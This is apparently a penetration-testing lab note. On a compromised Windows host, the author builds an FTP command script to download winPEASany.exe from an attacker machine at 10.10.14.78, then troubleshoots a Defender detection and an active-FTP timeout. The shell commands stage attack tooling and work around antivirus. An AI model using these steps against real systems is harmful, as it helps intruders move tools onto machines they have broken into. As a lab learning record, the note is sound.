# FTP download failure

As mentioned I tried the [approach here](https://ivanitlearning.wordpress.com/2020/07/05/rce-pe-experiments-with-server-2019-and-defender/).

```shell
PS C:\Users\tyler\Temp> echo open 10.10.14.78 > commands.txt
PS C:\Users\tyler\Temp> echo USER anonymous >> commands.txt
PS C:\Users\tyler\Temp> echo anything >> commands.txt
PS C:\Users\tyler\Temp> echo binary >> commands.txt
PS C:\Users\tyler\Temp> echo GET winPEASany.exe >> commands.txt
PS C:\Users\tyler\Temp> echo quit >> commands.txt
PS C:\Users\tyler\Temp> type commands.txt
PS C:\Users\tyler\Temp> type : Operation did not complete successfully because the file contains a virus or potentially unwanted software.

At line:1 char:1
+ type commands.txt
+ ~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ReadError: (C:\Users\tyler\Temp\commands.txt:String) [Get-Content], IOException
    + FullyQualifiedErrorId : GetContentReaderIOError,Microsoft.PowerShell.Commands.GetContentCommand
 

PS C:\Users\tyler\Temp> dir


    Directory: C:\Users\tyler\Temp


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----       10/10/2020  11:57 PM            164 commands.txt    
```

Somehow Defender detected it as a virus. Renaming it to txt made this problem go away but I encountered another one where it says `Active data channel timed out`

```shell
PS C:\Users\tyler\Temp> echo 'open 10.10.14.78' > commands.txt
PS C:\Users\tyler\Temp> echo 'USER anonymous' >> commands.txt
PS C:\Users\tyler\Temp> echo anything >> commands.txt
PS C:\Users\tyler\Temp> echo binary >> commands.txt
PS C:\Users\tyler\Temp> echo 'GET something.txt' >> commands.txt
PS C:\Users\tyler\Temp> echo quit >> commands.txt
PS C:\Users\tyler\Temp> type commands.txt
open 10.10.14.78
USER anonymous
anything
binary
GET something.txt
quit
PS C:\Users\tyler\Temp> ftp -v -n -s:commands.txt
open 10.10.14.78
Connected to 10.10.14.78.
220 pyftpdlib 1.2.0 ready.
530 Log in with USER and PASS first.

USER anonymous
331 Username ok, send password.

230 Login successful.
binary
200 Type set to: Binary.
GET something.txt
421 Active data channel timed out.
quit
221 Goodbye.
PS C:\Users\tyler\Temp>
```

Some [Googling found](https://stackoverflow.com/questions/42495442/421-active-data-channel-timed-out-with-ftp-client-connection-from-azure-vm-fr) it was due to Windows FTP clients supporting only active FTP protocol only which means the FTP server (Kali) needs to be able to connect back via another port. If this is blocked by Windows Firewall, FTP transfer won't work.